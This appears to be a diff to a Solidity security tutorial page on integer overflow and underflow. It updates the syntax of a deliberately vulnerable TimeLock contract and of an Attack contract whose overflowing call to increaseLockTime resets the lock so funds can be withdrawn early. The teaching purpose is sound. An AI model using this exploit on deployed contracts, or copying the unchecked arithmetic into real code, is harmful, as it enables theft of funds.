@@ -1,11 +1,12 @@
 // metadata
-export const version = "0.6.0"
+export const version = "0.6.10"
 export const title = "Arithmetic Overflow and Underflow"
 export const description = "An example of hacking Solidity with arithmetic overflow / underflow"
 
 const html = `<h3 id="vulnerability">Vulnerability</h3>
 <p>Integers in Solidity overflow / underflow without any errors.</p>
-<pre><code class="language-solidity">pragma solidity ^0.6.0;
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.10;
 
 // This contract is designed to act as a time vault.
 // User can deposit into this contract but cannot withdraw for atleast a week.
@@ -42,7 +43,7 @@ contract TimeLock {
         uint amount = balances[msg.sender];
         balances[msg.sender] = 0;
 
-        (bool sent, ) = msg.sender.call.value(amount)("");
+        (bool sent, ) = msg.sender.call{value: amount}("");
         require(sent, "Failed to send Ether");
     }
 }
@@ -57,7 +58,7 @@ contract Attack {
     fallback() external payable {}
 
     function attack() public payable {
-        timeLock.deposit.value(msg.value)();
+        timeLock.deposit{value: msg.value}();
         timeLock.increaseLockTime(
             uint(-1) - timeLock.lockTime(address(this)) + 1
         );
